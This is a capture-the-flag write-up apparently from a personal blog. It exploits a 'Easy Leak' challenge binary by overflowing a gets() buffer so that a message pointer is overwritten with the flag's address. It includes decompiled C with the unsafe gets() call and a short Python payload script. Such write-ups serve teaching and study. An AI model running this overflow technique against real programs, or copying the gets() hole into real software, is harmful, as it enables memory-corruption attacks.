---
title: "Easy Leak"
date: 2019-06-13 
draft: false
tags: ["Binary-Exploit","Writeup"]
type: page
---

<style>
.logo{
display: none !important;
}

</style>


## Goal of the exercise
Have the program to print the contents of the flag file.
## Research And Reverse Engineering Test
See if there are any protections:
<img src="/site/posts/cyber-challenge/static/checksec.png" width="50%" height="50%" align="center" class="center">
It appears to be only “NX” enabled.

## Decompiled C code of the executable:
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+0h] [rbp-50h]
  char s1; // [rsp+10h] [rbp-40h]
  char *s; // [rsp+30h] [rbp-20h]
  const char *v6; // [rsp+38h] [rbp-18h]
  const char *v7; // [rsp+40h] [rbp-10h]
  unsigned __int64 v8; // [rsp+48h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  memset(&s1, 0, 0x38uLL);
  s = "[!] Flag not found!";
  v6 = "[!] I was not able to read the flag!";
  v7 = "[!] Wrong! You should really make better guesses. This one was really poor. I bet you can do better. Try againg.";
  stream = fopen("./flag", "rb");
  if ( !stream )
  {
    puts(s);
    exit(-1);
  }
  fread(flag, 1024uLL, 1uLL, stream);
  puts("Guess the flag!");
  gets(&s1, 1024LL);
  if ( !strncmp(&s1, flag, 1024uLL) )
    printf("Great Job!\n Here is the flag %s\n", flag, stream);
  else
    printf(" %s\n", v7, stream);
  exit(0);
}
```

### Highlight the most important things:
* *v7 is a pointer
* *v7 points to a string in memory
* We write in s1
* The program will always print * v7

### Let’s try the program:

<img src="/site/posts/cyber-challenge/static/program.png" width="1000%" height="100%" align="center" class="center">
Actually the program printed the string to which *v7 points.

## Actual Analysis And Exploitation Begins Here
Let’s try to take control of “RIP” using a Cyclic string:
<img src="/site/posts/cyber-challenge/static/ripReg.png" width="70%" height="70%" align="center" class="center">
The program goes into error due to a fault address, but apparently it is not the value we entered.
We can check it with a Cyclic query:
```bash
rixon@killer-VirtualBox:~/Desktop/challenge/easyleak$ cyclic -l 0x7ffff7a5bcc0
[CRITICAL] Subpattern must be 4 bytes
```
This shows the presence of control on the stack!
## Assembly code analysis
<img src="/site/posts/cyber-challenge/static/assembly.png" width="70%" height="70%" align="center" class="center">

Pointers are initialized in the red outline, in sequence:

- char *s = 0x40087f
- char *v6 = 0x400898
- char *v7 = 0x4008c0

So our goal is to change "0x4008c0" in something else.
### Let's see how
<img src="/site/posts/cyber-challenge/static/strncmp.png" width="50%" height="50%" align="center" class="center">
The "strncmp" is done in the red outline, so the flag value is in this memory zone. Precisely in "0x6010a0".

Let's see where these values are stored in memory thanks to a breakpoint immediately after the "gets":
<img src="/site/posts/cyber-challenge/static/value.png" width="50%" height="50%" align="center" class="center">
### So the script we need is the following (x.py):
```python
import struct, sys 
junk = "A"*48
leak_address = struct.pack("<I", 0x6010a0)
payload = junk+leak_address
print(payload)
sys.stdout.flush()
```
### The result of the script it's the following:
<img src="/site/posts/cyber-challenge/static/flag.png" width="70%" height="70%" align="center" class="center">
As we can see now the program prints the flag value.

## JOB DONE!


